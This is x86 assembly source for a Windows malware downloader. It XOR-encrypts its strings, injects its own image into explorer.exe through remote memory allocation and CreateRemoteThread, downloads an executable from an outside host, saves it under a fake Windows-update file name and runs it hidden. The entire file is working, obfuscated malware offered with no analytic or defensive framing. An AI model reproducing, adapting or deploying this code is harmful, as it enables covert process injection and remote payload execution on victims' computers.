.586
.model flat, stdcall
option casemap:none

injected_thread proto

include inc\windows.inc
include inc\kernel32.inc
include inc\user32.inc
include inc\urlmon.inc
includelib lib\kernel32.lib
includelib lib\user32.lib
includelib lib\urlmon.lib
includelib lib\srt.lib

XOR_KEY = 90
crypt	macro	string
			irpc	c,<string>
			db	'&c' xor XOR_KEY
			endm
			db	0
			endm


decrypt		    PROTO :DWORD
xVirtualAllocEx     PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
xVirtualFreeEx 	    PROTO :DWORD, :DWORD, :DWORD, :DWORD
xCreateRemoteThread PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

.code

aTarget:		crypt		<shell_traywnd>
url:			crypt		<http://wmzarabotok.info/dos/test.exe>
exe:			crypt		<C:\Temp\KB887472-x86.exe>


lpModule		dd	?
lpNewModule		dd	?
lpProcess		dd	?
dwSize			dd	?
lpPID			dd	?
nBytesWritten	dd	?

start:

	invoke decrypt,addr url
	invoke decrypt,addr exe
	invoke decrypt,addr aTarget

	invoke GetModuleHandle,0
	mov [lpModule], eax
	
	mov edi,eax
	add edi,[edi+3Ch]
	add edi,4
	add edi,14h
	mov eax,[edi+38h]
	mov [dwSize],eax
	

	invoke FindWindow,offset aTarget,0	;find explorer.exe
	invoke GetWindowThreadProcessId, eax, addr lpPID
	invoke OpenProcess,PROCESS_ALL_ACCESS, FALSE, lpPID
	mov [lpProcess],eax
	invoke xVirtualFreeEx, [lpProcess], [lpModule], 0, MEM_RELEASE
	invoke xVirtualAllocEx, [lpProcess], [lpModule], dwSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE 
	invoke WriteProcessMemory, [lpProcess], eax, [lpModule], [dwSize], addr nBytesWritten
	invoke xCreateRemoteThread, [lpProcess], 0, 0, offset injected_thread, [lpModule], 0, ebx
	
	invoke ExitProcess, 0

decrypt proc cryptdata:DWORD
	push esi
	push edi
	
	mov esi,cryptdata
	mov edi,esi
	
xor_loop:
	lodsb
	or al,al
	jz xor_finished
	xor al, XOR_KEY
	stosb
	jmp xor_loop
	
xor_finished:   

	pop     edi
	pop     esi
	ret
decrypt     endp
	
injected_thread	proc
	
	invoke URLDownloadToFile,0,offset url,offset exe,0,0
	invoke WinExec, offset exe, SW_HIDE
	invoke ExitThread,0
	ret

injected_thread endp
end start
	